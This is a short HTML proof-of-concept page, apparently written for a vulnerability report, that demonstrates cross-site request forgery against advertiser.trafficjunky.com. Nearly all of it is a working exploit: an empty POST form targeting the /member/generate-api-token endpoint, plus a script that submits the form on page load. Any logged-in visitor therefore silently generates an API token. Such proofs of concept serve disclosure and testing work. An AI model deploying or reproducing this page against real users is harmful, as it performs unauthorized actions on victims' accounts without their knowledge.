<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC – TrafficJunky API Token</title>
</head>
<body>
  <h1>CSRF PoC – Silent API token generation</h1>
  <p>If you are logged in to advertiser.trafficjunky.com,
     this page will silently trigger the <code>/member/generate-api-token</code> endpoint.</p>

  <!-- Invisible auto-submitting form -->
  <form id="csrfForm"
        action="https://advertiser.trafficjunky.com/member/generate-api-token"
        method="POST">
    <!-- No fields required: original request uses POST with empty body -->
  </form>

  <script>
    // Auto-submit the form as soon as the page loads
    document.getElementById("csrfForm").submit();
  </script>
</body>
</html>
